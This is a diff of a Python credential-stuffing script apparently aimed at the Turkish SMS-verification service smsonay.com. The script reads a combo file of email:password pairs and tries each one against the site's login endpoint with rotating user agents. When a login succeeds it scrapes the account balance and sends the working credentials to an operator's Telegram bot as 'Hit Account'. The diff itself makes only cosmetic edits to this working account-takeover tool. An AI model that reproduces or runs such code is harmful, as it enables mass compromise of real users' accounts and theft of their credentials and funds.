@@ -1,6 +1,7 @@
 import http.client
 import urllib.parse
 import random
+import sys
 import os
 import pyfiglet
 from colorama import Fore, Style, init
@@ -8,11 +9,10 @@ from colorama import Fore, Style, init
 # Initialize colorama
 init(autoreset=True)
 
-# Define colors
-GREY = Fore.LIGHTBLACK_EX
-RED = Fore.RED
-GREEN = Fore.GREEN
-BLUE = Fore.BLUE
+GREY = Fore.LIGHTBLACK_EX  # Light grey
+RED = Fore.RED  # Red
+GREEN = Fore.GREEN  # Green
+BLUE = Fore.BLUE  # Blue
 RESET = Style.RESET_ALL
 
 def print_banner(title):
@@ -21,22 +21,26 @@ def print_banner(title):
     print(pyfiglet.figlet_format(title, font='smslant') + f"{GREEN}                       Github: SPARUX-666 </>\n")
     print(f"{GREEN}{'━'*67}{RESET}")
 
+print_banner('SmsOnayLogin+')
+
 def read_credentials_from_file(file_name):
-    credentials = []
     try:
         with open(file_name, "r", encoding="utf-8") as file:
             lines = file.readlines()
+            credentials = []
             for line in lines:
                 parts = line.strip().split(":")
                 if len(parts) == 2:
                     credentials.append(parts)
                 else:
                     print(RED + f"❌ Invalid Format: {line.strip()} - Expected format email:password")
+        return credentials
     except FileNotFoundError:
         print(RED + "❌ File not found!")
+        return []
     except Exception as error:
-        print(RED + f"❌ File reading error: {error}")
-    return credentials
+        print(RED + "❌ File reading error:", error)
+        return []
 
 def login(email, password, user_agent):
     try:
@@ -48,17 +52,19 @@ def login(email, password, user_agent):
             "Accept": "*/*",
             "Content-Type": "application/x-www-form-urlencoded"
         }
-        data = urllib.parse.urlencode({"email": email, "password": password})
+        data = urllib.parse.urlencode({
+            "email": email,
+            "password": password
+        })
 
         connection = http.client.HTTPSConnection(login_url)
         connection.request("POST", path, body=data, headers=headers)
         response = connection.getresponse()
         data = response.read()
         cookies = response.getheader("Set-Cookie")
-        connection.close()
         return response.status, data, cookies
     except Exception as error:
-        print(RED + f"❌ Request error: {error}")
+        print(RED + "Request error:", error)
         return None, None, None
 
 def get_balance(cookies, user_agent):
@@ -74,14 +80,13 @@ def get_balance(cookies, user_agent):
         connection.request("GET", path, headers=headers)
         response = connection.getresponse()
         data = response.read()
-        connection.close()
         if response.status == 200:
             return parse_balance(data.decode())
         else:
             print(RED + "❌ Cannot access the panel page!")
             return None
     except Exception as error:
-        print(RED + f"❌ Request error: {error}")
+        print(RED + "❌ Request error:", error)
         return None
 
 def parse_balance(html):
@@ -98,27 +103,29 @@ def parse_balance(html):
         balance_str = html[start_index:end_index].strip()
         return balance_str
     except Exception as error:
-        print(RED + f"❌ Parsing error: {error}")
+        print(RED + "❌ Parsing error:", error)
         return None
 
 def send_telegram_message(bot_token, chat_id, message):
     try:
         api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        params = urllib.parse.urlencode({"chat_id": chat_id, "text": message})
+        params = urllib.parse.urlencode({
+            "chat_id": chat_id,
+            "text": message
+        })
         connection = http.client.HTTPSConnection("api.telegram.org")
         connection.request("GET", f"/bot{bot_token}/sendMessage?{params}")
         response = connection.getresponse()
         response_text = response.read().decode()
-        connection.close()
         if response.status != 200:
             print(RED + f"❌ Failed to send to bot: {response_text}")
     except Exception as error:
-        print(RED + f"❌ Failed to send to bot: {error}")
+        print(RED + "❌ Failed to send to bot:", error)
 
 def scan_accounts(file_name, bot_token, chat_id, success_message):
     credentials = read_credentials_from_file(file_name)
     if not credentials:
-        print(RED + "❌ No valid credentials found!")
+        print(RED + "❌ File not found or incorrect file path!")
         return
 
     user_agents = [
@@ -128,13 +135,13 @@ def scan_accounts(file_name, bot_token, chat_id, success_message):
     ]
 
     failed_conditions = [
-        "Giriş Başarısız!\",\"message\":\"Lütfen email ve parolayı kontrol edip tekrar deneyin.",
+        "Giri\\u015f Ba\\u015far\\u0131s\\u0131z!\",\"message\":\"L\\u00fctfen email ve parolay\\u0131 kontrol edip tekrar deneyin.",
         "{\"success\":false,\"",
-        "Lütfen email ve parolayı kontrol edip tekrar deneyin."
+        "L\\u00fctfen email ve parolay\\u0131 kontrol edip tekrar deneyin."
     ]
     success_conditions = [
-        "Giriş Başarılı!",
-        "Başarıyla giriş yaptınız."
+        "Giri\\u015f Ba\\u015far\\u0131l\\u0131!",
+        "Ba\\u015far\\u0131yla giri\\u015f yapt\\u0131n\\u0131z."
     ]
 
     for email, password in credentials:
@@ -145,19 +152,18 @@ def scan_accounts(file_name, bot_token, chat_id, success_message):
 
         response_text = response_data.decode()
         if any(condition in response_text for condition in failed_conditions):
-            print(f"❌{RED} {email} : {password} | Invalid account!")
+            print(f"❌{RED}{email} : {password} | Invalid account!")
         elif any(condition in response_text for condition in success_conditions):
-            print(f"✅{GREEN} Login successful: {email} : {password}")
+            print(f"✅{GREEN}Login successful: {email} : {password}")
             balance = get_balance(cookies, user_agent)
             if balance is not None:
                 send_telegram_message(bot_token, chat_id, success_message.format(email=email, password=password, balance=balance))
             else:
                 print(RED + "❌ Could not retrieve balance.")
         else:
-            print(f"❌ {RED} {email} : An unknown error occurred.")
+            print(f"❌ {RED}{email} : An unknown error occurred.")
 
 def main():
-    print_banner('SmsOnayLogin+')
     bot_token = input(f"{BLUE}Enter Bot Token: {GREY}")
     chat_id = input(f"{BLUE}Enter Telegram ID: {GREY}")
     success_message = "smsonay.com\nHit Account\nEmail: {email}\nPassword: {password}\nBalance: {balance}\nGithub: Github.com/Sparux-666"
@@ -165,5 +171,4 @@ def main():
     file_name = input(f"{BLUE}Enter Combo File Path: {GREY}")
     scan_accounts(file_name, bot_token, chat_id, success_message)
 
-if __name__ == "__main__":
-    main()
+main()
